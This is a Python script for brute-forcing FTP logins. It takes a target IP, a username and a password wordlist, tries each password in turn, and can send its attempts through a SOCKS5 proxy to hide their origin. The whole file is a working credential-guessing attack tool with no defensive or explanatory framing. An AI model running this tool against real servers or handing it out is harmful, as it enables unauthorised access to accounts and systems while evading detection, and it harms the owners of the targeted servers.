from ftplib import FTP
import socks
import socket

def ftp_bruteforce(target_ip, username, password_list, proxy_info=None):
    if proxy_info:
        socks.set_default_proxy(socks.SOCKS5, proxy_info['proxy_ip'], int(proxy_info['proxy_port']))
        socket.socket = socks.socksocket
    with open(password_list, 'r') as passwords:
        for password in passwords:
            password = password.strip()
            try:
                ftp = FTP(target_ip)
                ftp.login(user=username, passwd=password)
                print(f"[+] Password found: {password}")
                ftp.quit()
                return
            except Exception as e:
                print(f"[-] Failed attempt: {password}")

    print("[!] Password not found.")

def main():
    target_ip = input("Enter target IP address: ")
    username = input("Enter username: ")
    password_list = input("Enter path to password list file: ")
    use_proxy = input("Do you want to use a proxy? (y/n): ").lower()
    proxy_info = None
    if use_proxy == 'y':
        proxy_ip = input("Enter proxy IP address: ")
        proxy_port = input("Enter proxy port: ")
        proxy_info = {'proxy_ip': proxy_ip, 'proxy_port': proxy_port}
    ftp_bruteforce(target_ip, username, password_list, proxy_info)

if __name__ == "__main__":
    main()